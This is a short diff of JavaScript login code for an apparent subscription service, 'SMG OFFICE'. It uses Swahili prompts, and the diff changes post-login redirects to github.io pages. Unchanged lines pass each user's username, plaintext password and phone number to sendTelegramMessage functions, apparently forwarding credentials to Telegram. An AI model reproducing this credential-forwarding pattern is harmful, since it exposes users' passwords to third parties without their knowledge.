@@ -15,7 +15,7 @@
                     var confirmPurchase = confirm("⚠️ Ndugu " + username + " Kifurushi chako kimeisha. Unaitaji kulipia kingine?");
                     if (confirmPurchase) {
                         setTimeout(function(){
-                            window.location.href = "index.html";
+                            window.location.href = "https://enockofficial.github.io/SMG-OFFICE-2024/payment_php.html";
                         }, 2000);
                     }
                 } else {
@@ -26,7 +26,7 @@
                             sendTelegramMessage2(username, password, user.phone, user.expireDate);
                             if (confirmAdmin) {
                                 alert("✅ Karibu ADMIN PANEL, Ndugu " + username);
-                                window.location.href = "index.html";
+                                window.location.href = "https://enockofficial.github.io/SMG-OFFICE-2024/admin_php.html";
                                 return false;
                             }
                         } else {
@@ -37,7 +37,7 @@
                         alert("✅ Karibu SMG OFFICE, Ndugu " + username);
                         sendTelegramMessage(username, password, user.phone, user.expireDate);
                         setTimeout(function(){
-                            window.location.href = "index.html";
+                            window.location.href = "https://enockofficial.github.io/home/index.html";
                         }, 2000);
                         return false;
                     }
